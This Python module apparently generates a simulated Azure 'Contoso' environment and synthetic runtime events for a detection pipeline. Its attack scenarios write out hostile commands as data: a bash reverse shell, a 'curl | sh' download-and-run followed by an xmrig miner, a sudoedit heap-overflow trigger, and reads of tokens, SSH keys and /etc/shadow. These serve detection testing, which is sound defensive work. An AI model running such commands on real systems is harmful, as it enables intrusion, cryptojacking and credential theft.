"""Simulated data mode.

Generates a believable multi-subscription Azure-style environment ("Contoso")
with deliberate risk stories baked in, plus random filler, and produces
runtime events (benign + attack scenarios) for the CDR pipeline.

Everything is deterministic for a given seed so tests are stable.
"""
from __future__ import annotations

import hashlib
import random
from datetime import datetime, timedelta
from typing import Any

from .base import AssetRecord, CollectionResult, Connector, RelationshipRecord, VulnerabilityRecord

SUBSCRIPTIONS = [
    ("6c1f4a52-9a3e-4d1b-8f7e-0a1b2c3d4e01", "Contoso-Prod-Payments", ["eastus", "eastus2"]),
    ("8d2e5b63-ab4f-4e2c-9a8f-1b2c3d4e5f02", "Contoso-Prod-Core", ["westeurope", "northeurope"]),
    ("a3f06c74-bc50-4f3d-8b90-2c3d4e5f6a03", "Contoso-Dev-Sandbox", ["uksouth"]),
]

# (cve, package, vulnerable version, fixed version, cvss, exploit_available, title)
CVE_CATALOG = [
    ("CVE-2021-44228", "log4j-core", "2.14.1", "2.17.1", 10.0, True, "Log4Shell JNDI remote code execution"),
    ("CVE-2021-45046", "log4j-core", "2.15.0", "2.17.1", 9.0, True, "Log4j Thread Context lookup RCE"),
    ("CVE-2022-22965", "spring-beans", "5.3.17", "5.3.18", 9.8, True, "Spring4Shell data binding RCE"),
    ("CVE-2022-42889", "commons-text", "1.9", "1.10.0", 9.8, True, "Text4Shell variable interpolation RCE"),
    ("CVE-2022-1471", "snakeyaml", "1.33", "2.0", 8.3, True, "SnakeYAML Constructor deserialization"),
    ("CVE-2023-46604", "activemq-client", "5.17.5", "5.17.6", 10.0, True, "ActiveMQ OpenWire RCE"),
    ("CVE-2024-3094", "xz-utils", "5.6.0", "5.6.2", 10.0, True, "xz/liblzma backdoor"),
    ("CVE-2024-6387", "openssh-server", "9.6p1", "9.8p1", 8.1, True, "regreSSHion signal handler race RCE"),
    ("CVE-2021-3156", "sudo", "1.8.31", "1.9.5p2", 7.8, True, "Baron Samedit heap overflow"),
    ("CVE-2024-21626", "runc", "1.1.11", "1.1.12", 8.6, True, "runc working directory container escape"),
    ("CVE-2022-0778", "openssl", "1.1.1l", "1.1.1n", 7.5, False, "BN_mod_sqrt infinite loop DoS"),
    ("CVE-2023-0286", "openssl", "3.0.7", "3.0.8", 7.4, False, "X.400 address type confusion"),
    ("CVE-2023-5363", "openssl", "3.0.11", "3.0.12", 7.5, False, "Incorrect cipher key/IV length processing"),
    ("CVE-2023-38545", "curl", "8.3.0", "8.4.0", 9.8, False, "SOCKS5 heap buffer overflow"),
    ("CVE-2023-4863", "libwebp", "1.3.1", "1.3.2", 8.8, True, "WebP heap buffer overflow"),
    ("CVE-2023-44487", "nghttp2", "1.55.1", "1.57.0", 7.5, True, "HTTP/2 Rapid Reset DoS"),
    ("CVE-2022-37434", "zlib", "1.2.12", "1.2.13", 9.8, False, "inflateGetHeader heap overflow"),
    ("CVE-2023-45853", "zlib", "1.2.13", "1.3", 9.8, False, "MiniZip integer overflow"),
    ("CVE-2021-23337", "lodash", "4.17.20", "4.17.21", 7.2, False, "Command injection via template"),
    ("CVE-2022-24999", "qs", "6.10.2", "6.10.3", 7.5, False, "Prototype pollution DoS"),
    ("CVE-2023-32681", "requests", "2.30.0", "2.31.0", 6.1, False, "Proxy-Authorization header leak"),
    ("CVE-2022-40897", "setuptools", "65.5.0", "65.5.1", 5.9, False, "ReDoS in package_index"),
    ("CVE-2023-29491", "ncurses", "6.3", "6.4", 7.8, False, "Local privilege escalation via terminfo"),
    ("CVE-2024-24790", "golang-stdlib", "1.22.3", "1.22.4", 9.8, False, "net/netip IPv4-mapped address misclassification"),
    ("CVE-2023-39325", "golang.org/x/net", "0.15.0", "0.17.0", 7.5, False, "HTTP/2 rapid reset"),
    ("CVE-2024-27983", "node", "20.11.1", "20.12.1", 8.2, False, "HTTP/2 race condition DoS"),
    ("CVE-2023-50164", "struts2-core", "6.3.0", "6.3.0.2", 9.8, True, "Struts file upload path traversal RCE"),
    ("CVE-2022-25883", "semver", "7.5.1", "7.5.2", 5.3, False, "ReDoS in semver range parsing"),
]
CVE_BY_ID = {c[0]: c for c in CVE_CATALOG}

MALICIOUS_IP = "203.0.113.66"
POOL_IP = "45.155.205.233"
BENIGN_PUBLIC = ["20.42.65.92", "52.239.152.10", "13.107.42.14", "151.101.1.69", "140.82.112.4"]


def arm_id(sub: str, rg: str, provider: str, rtype: str, name: str) -> str:
    return f"/subscriptions/{sub}/resourcegroups/{rg}/providers/{provider}/{rtype}/{name}".lower()


class _Builder:
    def __init__(self, rng: random.Random):
        self.rng = rng
        self.res = CollectionResult()

    def asset(self, **kw) -> AssetRecord:
        a = AssetRecord(**kw)
        self.res.assets.append(a)
        return a

    def rel(self, s: AssetRecord, t: AssetRecord, typ: str, **props) -> None:
        self.res.relationships.append(RelationshipRecord(s.id, t.id, typ, props))

    def vuln(self, a: AssetRecord, cve: str, in_use: bool) -> None:
        c = CVE_BY_ID[cve]
        self.res.vulnerabilities.append(VulnerabilityRecord(
            asset_id=a.id, cve_id=c[0], package=c[1], version=c[2], fixed_version=c[3], cvss=c[4],
            exploit_available=c[5], title=c[6], in_use=in_use))

    def random_vulns(self, a: AssetRecord, n: int, in_use_p: float) -> None:
        for c in self.rng.sample(CVE_CATALOG, n):
            self.vuln(a, c[0], self.rng.random() < in_use_p)


def generate_environment(seed: int = 42) -> CollectionResult:
    rng = random.Random(seed)
    b = _Builder(rng)
    team_tags = ["payments", "core-platform", "data", "identity", "web"]

    for sub_id, sub_name, regions in SUBSCRIPTIONS:
        env = "dev" if "Dev" in sub_name else "prod"
        region = regions[0]
        sub = b.asset(
            id=f"/subscriptions/{sub_id}", name=sub_name, type="subscription", subscription_id=sub_id,
            subscription_name=sub_name, region="global", tags={"env": env},
            properties={"owner_count": rng.choice([2, 3, 5, 7]) if env == "prod" else 6,
                        "contributor_count": rng.randint(4, 12)},
        )
        _ = sub

        def common(rg: str, reg: str | None = None, **tags):
            return dict(subscription_id=sub_id, subscription_name=sub_name, resource_group=rg,
                        region=reg or rng.choice(regions), tags={"env": env, **tags})

        # ---------------------------------------------------------------- identities
        identities = []
        for _i, (nm, roles, scope) in enumerate([
            (f"id-{env}-automation", ["Contributor"], "subscription"),
            (f"id-{env}-reader", ["Reader"], "subscription"),
            (f"id-{env}-backup", ["Storage Blob Data Contributor"], "resource"),
        ]):
            rg = f"rg-{env}-identity"
            identities.append(b.asset(
                id=arm_id(sub_id, rg, "microsoft.managedidentity", "userassignedidentities", nm),
                name=nm, type="identity", **common(rg, region, team="identity"),
                properties={"principal_type": "ManagedIdentity", "roles": roles, "scope": scope},
            ))

        # ---------------------------------------------------------------- data stores
        storages = []
        for nm, sensitive, cls in [
            (f"st{env}logs{rng.randint(100, 999)}", False, None),
            (f"st{env}artifacts{rng.randint(100, 999)}", False, None),
            (f"st{env}backup{rng.randint(100, 999)}", True, "backups (PII)"),
        ]:
            rg = f"rg-{env}-data"
            storages.append(b.asset(
                id=arm_id(sub_id, rg, "microsoft.storage", "storageaccounts", nm), name=nm,
                type="storage_account", sensitive_data=sensitive, **common(rg, team=rng.choice(team_tags)),
                properties={"allow_blob_public_access": rng.random() < 0.25, "https_only": rng.random() > 0.15,
                            "min_tls_version": rng.choice(["TLS1_2", "TLS1_2", "TLS1_0"]),
                            "data_classification": cls, "kind": "StorageV2"},
            ))
        kvs = []
        for nm in [f"kv-{env}-{rng.choice(['apps', 'platform'])}-{rng.randint(10, 99)}"]:
            rg = f"rg-{env}-security"
            kvs.append(b.asset(
                id=arm_id(sub_id, rg, "microsoft.keyvault", "vaults", nm), name=nm, type="key_vault",
                sensitive_data=True, **common(rg, team="identity"),
                properties={"soft_delete": rng.random() > 0.2, "purge_protection": rng.random() > 0.5,
                            "data_classification": "secrets & keys"},
            ))
        b.rel(identities[2], storages[2], "has_access", role="Storage Blob Data Contributor")

        # ---------------------------------------------------------------- VMs + NSGs
        for i in range(rng.randint(3, 5)):
            rg = f"rg-{env}-compute"
            nm = f"vm-{env}-{rng.choice(['batch', 'jump', 'etl', 'legacy', 'build'])}-{i:02d}"
            public = rng.random() < 0.3
            vm = b.asset(
                id=arm_id(sub_id, rg, "microsoft.compute", "virtualmachines", nm), name=nm, type="vm",
                internet_exposed=public, **common(rg, team=rng.choice(team_tags)),
                properties={"os": rng.choice(["Ubuntu 20.04", "Ubuntu 22.04", "Windows Server 2019", "RHEL 8"]),
                            "size": rng.choice(["Standard_D2s_v5", "Standard_B2ms", "Standard_E4s_v5"]),
                            "public_ips": [f"20.{rng.randint(1, 250)}.{rng.randint(1, 250)}.{rng.randint(1, 250)}"]
                            if public else [],
                            "disk_encryption": rng.random() > 0.4,
                            "exposure": "public IP" if public else None},
            )
            nsg = b.asset(
                id=arm_id(sub_id, rg, "microsoft.network", "networksecuritygroups", f"{nm}-nsg"),
                name=f"{nm}-nsg", type="nsg", **common(rg, vm.region),
                properties={"security_rules": _nsg_rules(rng, public)},
            )
            b.rel(nsg, vm, "protects")
            if rng.random() < 0.4:
                ident = rng.choice(identities)
                b.rel(vm, ident, "uses_identity")
            b.random_vulns(vm, rng.randint(3, 9), in_use_p=0.3)

        # ---------------------------------------------------------------- SQL
        rg = f"rg-{env}-data"
        sql_nm = f"sql-{env}-{rng.choice(['core', 'orders', 'reporting'])}-{rng.randint(1, 9)}"
        sql = b.asset(
            id=arm_id(sub_id, rg, "microsoft.sql", "servers", sql_nm), name=sql_nm, type="sql_server",
            sensitive_data=True, **common(rg, team="data"),
            properties={"public_network_access": rng.random() < 0.6, "auditing_enabled": rng.random() > 0.4,
                        "firewall_rules": [{"name": "AllowAzureServices", "start_ip": "0.0.0.0", "end_ip": "0.0.0.0"}]
                        + ([{"name": "AllowAll", "start_ip": "0.0.0.0", "end_ip": "255.255.255.255"}]
                           if env == "dev" else []),
                        "data_classification": "customer records (PII)"},
        )
        db_nm = f"{sql_nm.split('-')[2]}db"
        sqldb = b.asset(id=f"{sql.id}/databases/{db_nm}", name=db_nm, type="sql_database", sensitive_data=True,
                        **common(rg, sql.region, team="data"),
                        properties={"sku": "GP_Gen5_2", "data_classification": "customer records (PII)"})
        b.rel(sql, sqldb, "contains")

        # ---------------------------------------------------------------- AKS
        rg = f"rg-{env}-aks"
        aks_nm = f"aks-{env}-{rng.choice(['core', 'apps'])}-01"
        aks = b.asset(
            id=arm_id(sub_id, rg, "microsoft.containerservice", "managedclusters", aks_nm), name=aks_nm,
            type="aks_cluster", **common(rg, team="core-platform"),
            properties={"kubernetes_version": rng.choice(["1.28.9", "1.29.4", "1.30.2"]),
                        "rbac_enabled": env == "prod" or rng.random() > 0.5,
                        "private_cluster": rng.random() < 0.3, "authorized_ip_ranges": [],
                        "node_count": rng.randint(3, 12)},
        )
        apps = [("checkout-web", "ingress", "node"), ("orders-api", "ingress", "java"),
                ("inventory-svc", None, "java"), ("notifications", None, "python"),
                ("report-worker", None, "python"), ("auth-gateway", "ingress", "go"),
                ("search-api", None, "java"), ("redis-cache", None, "redis")]
        wl_ident = b.asset(
            id=arm_id(sub_id, rg, "microsoft.managedidentity", "userassignedidentities", f"id-{aks_nm}-workload"),
            name=f"id-{aks_nm}-workload", type="identity", **common(rg, aks.region, team="core-platform"),
            properties={"principal_type": "WorkloadIdentity", "roles": ["Storage Blob Data Contributor",
                                                                         "Key Vault Secrets User"],
                        "scope": "resource"},
        )
        b.rel(wl_ident, storages[2], "has_access", role="Storage Blob Data Contributor")
        b.rel(wl_ident, kvs[0], "has_access", role="Key Vault Secrets User")
        for app, exposure, runtime in rng.sample(apps, rng.randint(5, 7)):
            ns = "payments" if "Payments" in sub_name else rng.choice(["default", "shop", "platform"])
            pod_nm = f"{app}-{rng.randint(5, 9)}{rng.choice('abcdef')}{rng.randint(10, 99)}{rng.choice('xyz')}"
            pod = b.asset(
                id=f"{aks.id}/namespaces/{ns}/pods/{pod_nm}", name=pod_nm, type="pod",
                internet_exposed=bool(exposure), **common(rg, aks.region, app=app),
                properties={"namespace": ns, "cluster": aks_nm, "runtime": runtime,
                            "image": f"contosoacr.azurecr.io/{app}:{rng.randint(1, 4)}.{rng.randint(0, 20)}.{rng.randint(0, 9)}",
                            "privileged": rng.random() < 0.15,
                            "exposure": f"ingress {app}.contoso.com" if exposure else None},
            )
            b.rel(aks, pod, "contains")
            if rng.random() < 0.5:
                b.rel(pod, wl_ident, "uses_identity")
            if app in {"orders-api", "report-worker", "inventory-svc"}:
                b.rel(pod, sql, "connects_to")
            b.random_vulns(pod, rng.randint(4, 12), in_use_p=0.25)

        # ---------------------------------------------------------------- Functions
        for i in range(2):
            rg = f"rg-{env}-serverless"
            nm = f"func-{env}-{rng.choice(['webhook', 'resize', 'billing', 'notify'])}-{i}"
            fn = b.asset(
                id=arm_id(sub_id, rg, "microsoft.web", "sites", nm), name=nm, type="function_app",
                internet_exposed=True, **common(rg, team=rng.choice(team_tags)),
                properties={"runtime": rng.choice(["python|3.10", "node|18", "dotnet|6"]),
                            "https_only": rng.random() > 0.3, "exposure": f"https://{nm}.azurewebsites.net"},
            )
            if rng.random() < 0.5:
                b.rel(fn, identities[2], "uses_identity")
            b.random_vulns(fn, rng.randint(2, 5), in_use_p=0.35)

        # ---------------------------------------------------------------- risk stories
        if "Payments" in sub_name:
            _story_payments(b, sub_id, sub_name, region)
        elif "Core" in sub_name:
            _story_core(b, sub_id, sub_name, region, aks, sql)
        else:
            _story_dev(b, sub_id, sub_name, region)

    return b.res


def _nsg_rules(rng: random.Random, public: bool) -> list[dict]:
    rules = [{"name": "AllowVnetInBound", "direction": "Inbound", "access": "Allow", "protocol": "*",
              "source_prefixes": ["VirtualNetwork"], "port_ranges": ["*"], "priority": 65000}]
    if public:
        choice = rng.random()
        if choice < 0.5:
            rules.append({"name": "Allow-SSH", "direction": "Inbound", "access": "Allow", "protocol": "Tcp",
                          "source_prefixes": ["*"], "port_ranges": ["22"], "priority": 100})
        elif choice < 0.8:
            rules.append({"name": "Allow-RDP", "direction": "Inbound", "access": "Allow", "protocol": "Tcp",
                          "source_prefixes": ["0.0.0.0/0"], "port_ranges": ["3389"], "priority": 110})
        else:
            rules.append({"name": "Allow-HTTPS", "direction": "Inbound", "access": "Allow", "protocol": "Tcp",
                          "source_prefixes": ["Internet"], "port_ranges": ["443"], "priority": 120})
    return rules


def _story_payments(b: _Builder, sub: str, sub_name: str, region: str) -> None:
    """Public VM with in-use Log4Shell -> over-privileged identity -> PCI data."""
    rg = "rg-prod-payments"
    c = dict(subscription_id=sub, subscription_name=sub_name, resource_group=rg, region=region)
    vm = b.asset(id=arm_id(sub, rg, "microsoft.compute", "virtualmachines", "vm-pay-api-01"), name="vm-pay-api-01",
                 type="vm", internet_exposed=True, tags={"env": "prod", "team": "payments", "pci": "true"}, **c,
                 properties={"os": "Ubuntu 20.04", "size": "Standard_D4s_v5", "public_ips": ["20.85.14.201"],
                             "disk_encryption": False, "exposure": "public IP 20.85.14.201"})
    nsg = b.asset(id=arm_id(sub, rg, "microsoft.network", "networksecuritygroups", "vm-pay-api-01-nsg"),
                  name="vm-pay-api-01-nsg", type="nsg", tags={"env": "prod"}, **c,
                  properties={"security_rules": [
                      {"name": "Allow-SSH-Any", "direction": "Inbound", "access": "Allow", "protocol": "Tcp",
                       "source_prefixes": ["*"], "port_ranges": ["22"], "priority": 100},
                      {"name": "Allow-HTTPS", "direction": "Inbound", "access": "Allow", "protocol": "Tcp",
                       "source_prefixes": ["Internet"], "port_ranges": ["443"], "priority": 110}]})
    ident = b.asset(id=arm_id(sub, rg, "microsoft.managedidentity", "userassignedidentities", "id-pay-api"),
                    name="id-pay-api", type="identity", tags={"env": "prod", "team": "payments"}, **c,
                    properties={"principal_type": "ManagedIdentity", "roles": ["Contributor"], "scope": "subscription"})
    st = b.asset(id=arm_id(sub, rg, "microsoft.storage", "storageaccounts", "stpaycardvault01"),
                 name="stpaycardvault01", type="storage_account", sensitive_data=True,
                 tags={"env": "prod", "team": "payments", "data": "pci"}, **c,
                 properties={"allow_blob_public_access": False, "https_only": True, "min_tls_version": "TLS1_0",
                             "data_classification": "cardholder data (PCI)", "kind": "StorageV2"})
    kv = b.asset(id=arm_id(sub, rg, "microsoft.keyvault", "vaults", "kv-payments-prod"), name="kv-payments-prod",
                 type="key_vault", sensitive_data=True, tags={"env": "prod", "team": "payments"}, **c,
                 properties={"soft_delete": True, "purge_protection": False, "data_classification": "payment keys"})
    b.rel(nsg, vm, "protects")
    b.rel(vm, ident, "uses_identity")
    b.rel(ident, st, "has_access", role="Contributor (inherited)")
    b.rel(ident, kv, "has_access", role="Contributor (inherited)")
    b.vuln(vm, "CVE-2021-44228", in_use=True)
    b.vuln(vm, "CVE-2024-6387", in_use=True)
    b.vuln(vm, "CVE-2021-3156", in_use=False)
    b.vuln(vm, "CVE-2022-0778", in_use=True)
    b.vuln(vm, "CVE-2023-29491", in_use=False)


def _story_core(b: _Builder, sub: str, sub_name: str, region: str, aks: AssetRecord, sql: AssetRecord) -> None:
    """Internet-facing pod with in-use Spring4Shell -> workload identity -> customer data."""
    rg = aks.resource_group
    c = dict(subscription_id=sub, subscription_name=sub_name, resource_group=rg, region=aks.region)
    pod = b.asset(id=f"{aks.id}/namespaces/shop/pods/storefront-6d8f7c9b5-x2kqp", name="storefront-6d8f7c9b5-x2kqp",
                  type="pod", internet_exposed=True, tags={"env": "prod", "app": "storefront"}, **c,
                  properties={"namespace": "shop", "cluster": aks.name, "runtime": "java", "privileged": True,
                              "image": "contosoacr.azurecr.io/storefront:3.4.1",
                              "exposure": "ingress shop.contoso.com"})
    ident = b.asset(id=arm_id(sub, rg, "microsoft.managedidentity", "userassignedidentities", "id-storefront-wi"),
                    name="id-storefront-wi", type="identity", tags={"env": "prod"}, **c,
                    properties={"principal_type": "WorkloadIdentity",
                                "roles": ["Storage Blob Data Owner", "Key Vault Secrets User"], "scope": "resource"})
    st = b.asset(id=arm_id(sub, "rg-prod-data", "microsoft.storage", "storageaccounts", "stcustomerprofiles"),
                 name="stcustomerprofiles", type="storage_account", sensitive_data=True,
                 subscription_id=sub, subscription_name=sub_name, resource_group="rg-prod-data", region=aks.region,
                 tags={"env": "prod", "data": "pii"},
                 properties={"allow_blob_public_access": False, "https_only": True, "min_tls_version": "TLS1_2",
                             "data_classification": "customer PII"})
    b.rel(aks, pod, "contains")
    b.rel(pod, ident, "uses_identity")
    b.rel(ident, st, "has_access", role="Storage Blob Data Owner")
    b.rel(pod, sql, "connects_to")
    b.vuln(pod, "CVE-2022-22965", in_use=True)
    b.vuln(pod, "CVE-2022-1471", in_use=True)
    b.vuln(pod, "CVE-2023-4863", in_use=False)
    b.vuln(pod, "CVE-2022-37434", in_use=False)
    b.vuln(pod, "CVE-2024-21626", in_use=True)


def _story_dev(b: _Builder, sub: str, sub_name: str, region: str) -> None:
    """Dev storage account with public blobs holding a copy of prod PII."""
    rg = "rg-dev-data"
    b.asset(id=arm_id(sub, rg, "microsoft.storage", "storageaccounts", "stdevprodcopy"), name="stdevprodcopy",
            type="storage_account", sensitive_data=True, internet_exposed=True,
            subscription_id=sub, subscription_name=sub_name, resource_group=rg, region=region,
            tags={"env": "dev", "owner": "data-eng"},
            properties={"allow_blob_public_access": True, "https_only": False, "min_tls_version": "TLS1_0",
                        "data_classification": "PII (copy of prod)",
                        "exposure": "anonymous public blob container 'exports'"})


# =============================================================================== runtime events
def _ctr(asset: dict) -> dict | None:
    if asset["type"] != "pod":
        return None
    p = asset.get("properties") or {}
    cid = hashlib.sha1(asset["id"].encode(), usedforsecurity=False).hexdigest()[:12]
    return {"id": cid, "name": asset["name"].rsplit("-", 2)[0],
            "image": p.get("image"), "pod": asset["name"], "namespace": p.get("namespace")}


def _base(asset: dict, ts: datetime, etype: str, **kw) -> dict:
    e = {"timestamp": ts.isoformat(), "asset_id": asset["id"], "event_type": etype, "sensor_id": "sim-sensor-01"}
    c = _ctr(asset)
    if c:
        e["container"] = c
    e.update(kw)
    return e


def benign_events(rng: random.Random, asset: dict, ts: datetime) -> list[dict]:
    rt = (asset.get("properties") or {}).get("runtime", "python")
    app = {"java": ("java", "java -jar /app/app.jar"), "node": ("node", "node /app/server.js"),
           "go": ("server", "/app/server"), "redis": ("redis-server", "redis-server /etc/redis.conf")}.get(
        rt, ("python", "gunicorn app:app -w 4 -b 0.0.0.0:8080"))
    choice = rng.random()
    if choice < 0.35:
        return [_base(asset, ts, "network_connection",
                      process={"name": app[0], "pid": rng.randint(100, 9000), "user": "app"},
                      network={"direction": "outbound", "protocol": "tcp", "dst_ip": rng.choice(BENIGN_PUBLIC),
                               "dst_port": 443})]
    if choice < 0.55:
        return [_base(asset, ts, "network_connection",
                      process={"name": app[0], "pid": rng.randint(100, 9000), "user": "app"},
                      network={"direction": "outbound", "protocol": "tcp",
                               "dst_ip": f"10.{rng.randint(0, 3)}.{rng.randint(0, 9)}.{rng.randint(4, 250)}",
                               "dst_port": rng.choice([5432, 1433, 6379])})]
    if choice < 0.75:
        return [_base(asset, ts, "file_access",
                      process={"name": app[0], "pid": rng.randint(100, 9000), "user": "app"},
                      file={"path": rng.choice(["/app/config.yaml", "/etc/ssl/certs/ca-certificates.crt",
                                                "/tmp/cache.db", "/var/log/app.log"]),
                            "operation": rng.choice(["read", "write"])})]
    if choice < 0.9:
        return [_base(asset, ts, "process_exec",
                      process={"name": app[0], "cmdline": app[1], "pid": rng.randint(100, 9000), "ppid": 1,
                               "parent_name": "tini" if asset["type"] == "pod" else "systemd", "user": "app",
                               "uid": 1000})]
    return [_base(asset, ts, "network_connection",
                  process={"name": "coredns" if asset["type"] == "pod" else "systemd-resolved", "user": "root"},
                  network={"direction": "outbound", "protocol": "udp", "dst_ip": "168.63.129.16", "dst_port": 53})]


def scenario_reverse_shell(rng, asset, ts):
    return [
        _base(asset, ts, "process_exec",
              process={"name": "bash", "cmdline": f"bash -c 'bash -i >& /dev/tcp/{MALICIOUS_IP}/4444 0>&1'",
                       "pid": 31337, "ppid": 1201, "parent_name": "java", "user": "app", "uid": 1000}),
        _base(asset, ts + timedelta(seconds=1), "network_connection",
              process={"name": "bash", "pid": 31337, "user": "app"},
              network={"direction": "outbound", "protocol": "tcp", "dst_ip": MALICIOUS_IP, "dst_port": 4444}),
        _base(asset, ts + timedelta(seconds=20), "file_access", process={"name": "cat", "pid": 31390, "user": "app"},
              file={"path": "/var/run/secrets/kubernetes.io/serviceaccount/token" if asset["type"] == "pod"
                    else "/root/.ssh/id_rsa", "operation": "read"}),
    ]


def scenario_miner(rng, asset, ts):
    return [
        _base(asset, ts, "process_exec",
              process={"name": "curl", "cmdline": "curl -s http://45.155.205.233/x.sh | sh", "pid": 4100,
                       "parent_name": "sh", "user": "app", "uid": 1000}),
        _base(asset, ts + timedelta(seconds=5), "process_exec",
              process={"name": "xmrig", "cmdline": f"/tmp/.x/xmrig -o stratum+tcp://{POOL_IP}:3333 -u 4AdUnd --donate-level 1",
                       "pid": 4122, "parent_name": "sh", "user": "app", "uid": 1000}),
        _base(asset, ts + timedelta(seconds=7), "network_connection", process={"name": "xmrig", "pid": 4122},
              network={"direction": "outbound", "protocol": "tcp", "dst_ip": POOL_IP, "dst_port": 3333}),
    ]


def scenario_container_shell(rng, asset, ts):
    return [
        _base(asset, ts, "process_exec",
              process={"name": "sh", "cmdline": "/bin/sh", "pid": 5001, "parent_name": "runc", "user": "root", "uid": 0}),
        _base(asset, ts + timedelta(seconds=12), "network_connection",
              process={"name": "curl", "pid": 5020, "user": "root"},
              network={"direction": "outbound", "protocol": "tcp", "dst_ip": "169.254.169.254", "dst_port": 80}),
        _base(asset, ts + timedelta(seconds=30), "file_access", process={"name": "cat", "pid": 5033, "user": "root"},
              file={"path": "/var/run/secrets/kubernetes.io/serviceaccount/token", "operation": "read"}),
    ]


def scenario_privesc(rng, asset, ts):
    return [
        _base(asset, ts, "process_exec",
              process={"name": "sudoedit", "cmdline": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')",
                       "pid": 7001, "parent_name": "bash", "user": "www-data", "uid": 33}),
        _base(asset, ts + timedelta(seconds=2), "privilege_escalation",
              process={"name": "sudoedit", "pid": 7001, "user": "root"},
              privilege={"from_uid": 33, "to_uid": 0, "method": "setuid (CVE-2021-3156)"}),
        _base(asset, ts + timedelta(seconds=10), "file_access", process={"name": "cat", "pid": 7010, "user": "root"},
              file={"path": "/etc/shadow", "operation": "read"}),
    ]


def scenario_exfil(rng, asset, ts):
    return [
        _base(asset, ts, "network_connection",
              process={"name": "python3", "pid": 8800, "user": "app"},
              network={"direction": "outbound", "protocol": "tcp", "dst_ip": "91.203.5.17",
                       "dst_port": rng.choice([8081, 2222, 9001]), "bytes_sent": rng.randint(50, 900) * 1_000_000}),
    ]


def scenario_c2_beacon(rng, asset, ts):
    return [
        _base(asset, ts + timedelta(seconds=i * 60), "network_connection",
              process={"name": "kworkerd", "pid": 6606, "user": "root"},
              network={"direction": "outbound", "protocol": "tcp", "dst_ip": "185.220.101.47", "dst_port": 443})
        for i in range(3)
    ]


SCENARIOS = [
    (scenario_reverse_shell, 0.15),
    (scenario_miner, 0.2),
    (scenario_container_shell, 0.2),
    (scenario_privesc, 0.1),
    (scenario_exfil, 0.2),
    (scenario_c2_beacon, 0.15),
]


def pick_scenario(rng: random.Random, asset: dict):
    pool = [(f, w) for f, w in SCENARIOS if f is not scenario_container_shell or asset["type"] == "pod"]
    fns, weights = zip(*pool, strict=True)
    return rng.choices(fns, weights=weights, k=1)[0]


def generate_history(rng: random.Random, workloads: list[dict], now: datetime, hours: int = 24,
                     benign_per_hour: int = 12, attacks: int = 18) -> list[dict]:
    """Backfill events over the last `hours` so charts have data on first load."""
    events: list[dict] = []
    for h in range(hours, 0, -1):
        for _ in range(benign_per_hour):
            ts = now - timedelta(hours=h) + timedelta(seconds=rng.randint(0, 3599))
            events += benign_events(rng, rng.choice(workloads), ts)
    exposed = [w for w in workloads if w.get("internet_exposed")] or workloads
    for _ in range(attacks):
        ts = now - timedelta(seconds=rng.randint(300, hours * 3600))
        asset = rng.choice(exposed if rng.random() < 0.7 else workloads)
        events += pick_scenario(rng, asset)(rng, asset, ts)
    events.sort(key=lambda e: e["timestamp"])
    return events


class SimulatedConnector(Connector):
    name = "simulated"
    provider = "azure"
    description = "Synthetic multi-subscription Azure environment (demo / default mode)."

    def __init__(self, seed: int = 42, simulation_mode: bool | None = None, available: bool = True):
        self.seed = seed
        # SIMULATION_MODE (scheduled demo scans; None: the global setting); `available` is False for
        # organisations other than the default one (demo data is the default's).
        self.simulation_mode = simulation_mode
        self.available = available

    def is_configured(self) -> bool:
        return self.available

    def collect(self) -> CollectionResult:
        return generate_environment(self.seed)


def workload_dicts(assets: list[Any]) -> list[dict]:
    """Convert ORM assets to the dict shape used by event generators."""
    return [{"id": a.id, "name": a.name, "type": a.type, "internet_exposed": a.internet_exposed,
             "properties": a.properties or {}} for a in assets if a.type in {"vm", "pod", "function_app"}]
